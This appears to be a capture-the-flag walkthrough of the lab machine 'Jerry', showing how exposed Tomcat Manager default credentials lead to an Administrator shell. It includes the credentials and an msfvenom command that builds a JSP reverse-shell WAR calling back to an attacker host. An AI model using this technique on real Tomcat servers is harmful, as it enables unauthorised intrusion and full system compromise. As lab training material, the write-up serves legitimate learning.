# Jerry - Walkthrough

## 🧗 Initial Foothold

### 🌐 1. Apache Tomcat on Port 8080
- Discovered **Apache Tomcat** running on port `8080`:
  ```
  http://10.129.136.9:8080
  ```

### 🔑 2. Access Tomcat Manager
- Clicked on the **Manager App** link, which prompted for credentials.
- Clicked **Cancel**, and surprisingly, a page was shown that revealed credentials:
  ```
  Username: tomcat
  Password: s3cret
  ```

### 🔓 3. Login and Upload WAR
- Used the credentials to log into the Manager App at:
  ```
  http://10.129.136.9:8080/manager/html
  ```
- Found an option to **upload a WAR file**.

### 💣 4. Create and Upload Reverse Shell
- Created a WAR file with `msfvenom`:
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f war > shell.war
  ```

- Verified contents using:
  ```bash
  jar tf shell.war
  ```

- Identified the `.jsp` shell file name inside the WAR.

### 🛰️ 5. Trigger Shell
- Uploaded the WAR via Tomcat Manager.
- Accessed the `.jsp` file in the deployed application’s path.
- Set up a listener and received a reverse shell.

---

## 🧠 Notes

- The obtained shell runs with **Administrator** privileges.
- This machine demonstrates the risk of misconfigured or exposed Tomcat Manager.
- Simple credential leak led directly to full compromise.
